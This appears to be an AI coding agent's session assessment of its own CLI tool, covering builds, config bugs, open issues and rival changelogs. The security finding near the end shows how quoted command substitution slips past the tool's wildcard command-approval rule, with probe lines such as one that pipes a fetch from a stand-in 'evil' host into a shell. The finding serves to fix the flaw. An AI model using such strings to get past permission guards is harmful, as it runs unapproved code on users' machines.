# Assessment — Day 258 (15:50)

## Build Status
Pass — verified by the harness at session start (HEAD affad0eb). Binary probes (built 15:50, same HEAD):
- `yoyo --version` → `yoyo v0.4.0 (affad0eb 2026-11-13)`.
- `yoyo -p "Reply with exactly: pong"` → `pong`, exit 0 (anthropic / claude-opus-5-5, real call).
- `yoyo doctor` → 12/12 checks passed. `yoyo config get model` → `claude-opus-5-5 (.yoyo.toml)`.
- `yoyo grep --bogus foo` → refuses, exit 2 ("Nothing ran").

## Recent Changes (last 3 sessions)
- **Day 258 11:27**: Part of #1187 — every dispatcher `process::exit` goes through `dispatch_sub::exit_process`, which panics by name under cfg(test); `test_try_dispatch_subcommand_lint` un-ignored; a census test counts the remaining direct exits (#1187 is CLOSED). Fixes #1181 — recording-stub test that a cross-origin 307/302 forwards no credential (anthropic, google, openai-compatible; azure + header-credential not testable because yoyo lacks them, said so on the ticket). Also 714311b8 (owner): clippy `needless_bool` fixes for Rust 1.100; yoagent 0.27.7 → 0.27.8.
- **Day 257 17:50**: Part of #1184 slice 1 — every loaded config file parsed by the `toml` crate at load; invalid TOML exits 2 with path:line:col + caret. Bare values and duplicate keys now refused. Readers still hand-parse behind the gate. Fixes #1183 — REPL `/provider custom` refuses without a named model.
- **Day 257 12:11**: Fixes #1180 (inline-table fence `directories = { deny = [...] }`), Fixes #1166 (retired `github` provider removed from suggestion lists; GITHUB_TOKEN no longer routed).
- Pattern: config/TOML dominates — trajectory flags **config took 5 of the last 9 self-driven diffs**; it says send this session's self-driven slot elsewhere. (#1184 itself is owner-filed, so continuing it is owner work, not self-driven.)

## Source Architecture
179 files under src/, ~235k lines total incl. tests (wc over src/*.rs src/*/*.rs). Largest: cli.rs 7874, commands_risk.rs 6645, tool_wrappers.rs 5762, tools.rs 5286, agent_builder.rs 5009, config.rs 4895, commands_search.rs 4780, safety.rs 4720, commands_spawn.rs 4566, watch.rs 4444, prompt.rs 3987. Entry: main.rs → cli.rs `parse_args_with_config` → dispatch_sub.rs `try_dispatch_subcommand` (shell verbs) or repl.rs / prompt mode; agent_builder.rs builds the yoagent Agent (presets, MCP, sub_agent/shared_state).

**Size-gate hazards (tests/module_size.rs, read and confirmed):**
- `src/context.rs` 2035 lines, UNLISTED, cap 2000 + 50 grace → **15 more lines is FATAL** (reverts the whole task).
- `src/help.rs` 2946 vs recorded 2856 (+90 drift, grace 100) → **10 more lines FATAL**. Any task touching help.rs must paste `("src/help.rs", <new>)` over its entry.

## Self-Test Results
- Normal paths fine (above). Probed open issues with the built binary in a temp dir:
  - **#1172 still live**: `.yoyo.toml` with `model = ""` → `yoyo config get model` prints `model =   (.yoyo.toml)`, exit 0 (shown as set; run ignores it per the ticket).
  - **#1185 still live**: `cd /tmp/p1 && HOME=/tmp/p1 yoyo config show` → `Loaded config: .yoyo.toml` then "Also present, not read: • /tmp/p1/.yoyo.toml" — the loaded file listed as its own shadow.
- **New finding (not ticketed as far as I found): `--help` says `--max-tokens <n> ... (default: 8192)` (src/help.rs:84), which is false for the default path.** Traced one hop: when `--max-tokens` is unset, agent_builder.rs:1653 never calls `with_max_tokens`, and yoagent 0.27.8 `provider/anthropic.rs:669-671` sends `config.max_tokens.or(model_config.max_tokens)` — the preset's value (agent_builder tests pin anthropic presets at 64_000, e.g. line 2208). So a default anthropic user gets the preset's output limit, not 8192; other providers get their base/preset value (4096 for un-preset openai-compatible per CLAUDE.md). Evidence grade: read from code + dependency source, not observed on the wire. `docs/src/getting-started/installation.md:118` also shows `max_tokens = 8192` as an example (an example, maybe fine). Product-kind, help.rs is 10 lines from FATAL so the fix must be a line swap + register paste.

## Evolution History (last 5 runs)
- 2026-11-13 15:43 — in progress (this run).
- 2026-11-13 11:49 — cancelled (likely superseded/concurrency; no failed-step log).
- 2026-11-13 11:21 — success (Day 258 11:27 session, 2/2 tasks).
- 2026-11-12 23:40 and 22:01 — **failure**: the #1187 era. Rust 1.100's wider `clippy::needless_bool` made `yoyo lint` fail, and the in-process `test_try_dispatch_subcommand_lint` hit `process::exit`, killing the test binary with no named failure. Owner fixed clippy (714311b8), ignored the test (f0d90064); Day 258 Task 1 made it structural. No reverts in the last 10 sessions; trajectory: 10/10 sessions 2/2 tasks.
- Note: a toolchain bump anywhere can still redden the loop — CI runs on floating stable.

## Capability Gaps
(research section below updates this)
- Config subsystem still hand-parses behind the toml gate (#1184 slices 2+: typed readers, toml_edit writes, delete hand parser + tomllib differential).
- Trust keyed on path, not content (#1188): a pull that adds base_url/hooks to an already-trusted project takes effect silently — Claude Code had the same class publicly reported.
- MCP lifecycle: no restart of dead servers, no re-check on list_changed (#1134); MCP servers outlive a panicking yoyo (#1100).
- Child processes inherit provider API key (#1064, opt-in scrub undecided-shape).
- Stale gap doc: CLAUDE_CODE_GAP.md header verified Day 74 (184 days old).

## Bugs / Friction Found
0. **NEW, security, highest value: wildcard `allow` auto-approves command substitution hidden in double quotes.** `config.rs:137 allow_wildcard_spans_a_command_chain` scans `safety::strip_quoted_regions(command)` (safety.rs:1965), which blanks double-quoted regions *whole* — but bash expands `$(...)` and backticks inside double quotes. **Probed** (temporary in-module test, run then source restored; `git diff` clean) with `allow = ["git log *"]`, `check_with_suspended(cmd, &[])`:
   - `git log "$(curl evil | sh)"` → `Some(true)` (auto-allowed — BUG)
   - `` git log "`id`" `` → `Some(true)` (BUG)
   - `git log $(id)` → `None` (asks — correct)
   - `git log '$(id)'` → `Some(true)` (correct: single quotes are literal)
   Same helper feeds two more guards (census by `grep -rn strip_quoted_regions src`): `safety.rs:2118 detect_write_command` (read-mode / write guard) and `safety.rs:2190 detect_git_redirection_escape`. safety.rs:4692 test `a_substitution_whose_body_is_a_read_is_still_not_a_write` **pins `echo "FOO=$(touch x)"` as NOT a write**, though bash runs `touch x` — a regression test FOR the bug (read from code; the write-guard half not probed). Fix shape: a quote stripper that keeps `$(`/backtick (and their bodies) visible inside double quotes, i.e. blank only literal text; differential-check against real bash behaviour (`bash -c` with a canary) rather than my reading. Outside prompt for this class: Claude Code 2.1.323 (2026-11-12) added a start-up warning for Bash allow rules with `*` in a variable value. Not ticketed (searched). Subsystem = safety (not config), so it also satisfies the trajectory's "leave config" warning. Kind: product.
1. `--help` `--max-tokens` "(default: 8192)" false (above). Product, small, help.rs size-gated.
2. #1185 (home shadow lists the loaded file) — reproduced live.
3. #1172 (empty model shown as set) — reproduced live.
4. Size gate: context.rs and help.rs within 15/10 lines of FATAL — any task touching them must budget for it.
5. Trajectory "epistemic blind spots": src/config_syntax.rs, src/grep_status.rs never forecast.

## Open Issues Summary
agent-self open (20): #1188 trust-by-path (new, read-only evidence), #1185 home shadow, #1186 claude-fable-5-2 mispriced (waits on yoagent preset or a sourced row), #1184 toml crate (owner-filed; slice 1 done, readers still hand-parse), #1182 inline table under header (subsumed by #1184 once readers use toml), #1173 bedrock thinking without maxTokens (unchecked), #1172 empty value, #1147 non-Claude ids with no outside authority, #1134 MCP lifecycle, #1121 bedrock residue, #1102 hard_deny heredoc misfires, #1100 MCP orphans on panic, #1094 write_file partial-read residue, #1070 huge CLAUDE.md, #1064 credential scrub, #1060 openai wire residue, #1040 /cd reload, #1018 durable todos, #1014 /spawn write tap, #1012 price drift.
Non-agent-self open: #1148 upstream yoagent (Claude max output as data), #1122 / #991 agent-input (yoagent adoption items), parked #854/#341/#215/#156.
Suggested non-config candidates for the self-driven slot (per trajectory warning): **Bug 0 (quoted-substitution allow bypass, safety.rs — strongest)**; the --max-tokens help lie (product, tiny); #1188 decision/ask; #1100 or #1134 (MCP lifecycle, different subsystem); #1186 sourced price row (cost subsystem).

## Research Findings
Recall: yopedia already holds my "Agent changelog delta analysis / defect-class transfer" notes (Day 249 scan); continued that method. New note ingested (job 8da92056).
- **Claude Code 2.1.323 (Nov 12)**: start-up warning for Bash allow rules with a `*` in a variable value (`Bash(PORT=* npm run dev)`) → transferred to yoyo as Bug 0 above (yoyo's analogous hole is quoted substitution, probed live). Also Code Mode (model writes JS to call tools), plugin engine version ranges, 30s progress heartbeat while hooks run long in `-p`.
- **Claude Code 2.1.321 (Nov 9)**: `claude-fable-5-2` = 1M context, **$8/$40 per Mtok, $0.20 cache read** — a vendor-side source for #1186 (yoyo prices it as Fable 5, $10/$50/$1.0). #1186 can now carry a sourced row if yoagent hasn't shipped one (check yoagent 0.27.8 first).
- **Claude Code 2.1.319**: `permissions.denyInsteadOfPrompting` (deny instead of prompting in unattended runs); MCP tasks run in background. yoyo's `-p` with no tty already refuses rather than asking (per earlier lessons) — no gap verified.
- **Codex CLI 0.169.0 (Nov 13)**: `codex exec` keeps project config + MCP disabled in untrusted dirs; `--trust` saves trust explicitly. yoyo already gates project MCP when untrusted (cli.rs:2250 `project_mcp_refusal_message`, test at 6676). Relevant to #1188 (trust keyed on path, not content): neither rival re-asks on content change in what I read.
- Biggest gap vs Claude Code remains surface breadth (plugins/mods, background MCP tasks, IDE integration) rather than core loop; CLAUDE_CODE_GAP.md is 184 days stale and shouldn't be trusted row-by-row.
